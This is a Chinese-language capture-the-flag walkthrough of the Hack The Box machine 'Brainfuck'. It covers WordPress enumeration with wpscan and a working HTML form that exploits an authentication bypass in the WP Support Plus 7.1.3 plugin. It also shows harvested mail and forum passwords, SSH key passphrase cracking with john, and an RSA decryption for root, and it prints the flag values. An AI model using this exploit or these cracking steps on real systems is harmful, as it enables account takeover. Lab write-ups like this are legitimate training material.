# Brainfuck

> victim: 10.10.10.17

## 扫描分析

有443端口，结合扫描信息，需要在`/etc/hosts`添加以下内容 

```
10.10.10.17	www.brainfuck.htb brainfuck.htb sup3rs3cr3t.brainfuck.htb
```

## HTTPS分析

简单搜索后发现两个地址

- brainfuck.htb(www.brainfuck.htb)
  - WordPress
- sup3rs3cr3t.brainfuck.htb
  - Flarum

添加hosts后，访问`brainfuck.htb`

## brainfuck.htb

> https://brainfuck.htb/

www.brainfuck.htb也重定向到这里，简单一看就知道它是WordPress

利用`wpscan`进行扫描

```bash
wpscan --url https://brainfuck.htb --disable-tls-checks
# 禁用证书检查
```

EDB搜索：wp support plus responsive ticket system 7.1.3

- [ WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation](https://www.exploit-db.com/exploits/41006)
- [WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection](https://www.exploit-db.com/exploits/40939)

枚举用户

```bash
wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u
```

通过已有EXP进行PE，可以登录任意账号

```html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="administrator">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```

成功登录administrator，也可以登录admin了

admin是wordpress管理员，成功获得第一个立足点

打开`Setting`，找到邮件配置

- account
  - orestis@brainfuck.htb
- username
  - orestis
- password
  - kHGuERB29DNiNE

## SMTP信息收集

使用上述信息连接邮件服务器，可使用`evolution`

在邮件中获取到论坛账号

```
Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
```

- username
  - orestis
- password
  - kIEnnfEKJ#9UmdO

## sup3rs3cr3t.brainfuck.htb

> https://sup3rs3cr3t.brainfuck.htb/

进去后是一个Flarum论坛，用收集到的信息进行登录

登录后看到隐藏帖子，有一些信息

### Posts - SSH Access

可以找到维吉尼亚密码

```
Orestis - Hacking for fun and profit
```

### Posts - Key

内容似乎被加密了，简单推测是凯撒，试了一下不对，解释说是维吉尼亚，解密内容见`flarum chat.md`

得到id_rsa私钥但是貌似有密码，Orestis说要爆破

## RSA

爆破私钥

```bash
# 将ssh转换为john爆破格式
locate ssh2john #找到脚本位置
python /usr/share/john/ssh2john.py id_rsa >john_rsa
sudo john john_rsa -w=/usr/share/wordlists/rockyou.txt
```

找到密码：3poulakia!

连接服务器

```bash
chmod 600 id_rsa
ssh -i id_rsa orestis@10.10.10.17
```

成功连接，拿到user.txt

```
2c11cfbc5b959f73ac15a3310bd097c9
```

## PrivilegeEscalation

家目录下的文件

- encrypt.sage
- output.txt
- debug.txt

可以知道是一个加密过程，需要进行解密

### RSA

通过debug.txt知道pqe

通过output.txt可以知道密文

非常简单的RSA解密，所有因子都有了，可以直接解

代码见`rsa_decode.py`

得到原文为

```
24604052029401386049980296953784287079059245867880966944246662849341507003750
```

先转为16进制再转换为字符串即可

CyberChef：

```
To Base(16) -> From Hex
```
得到
```
6efc1a5dbb8904751ce6566a305bb8ef
```

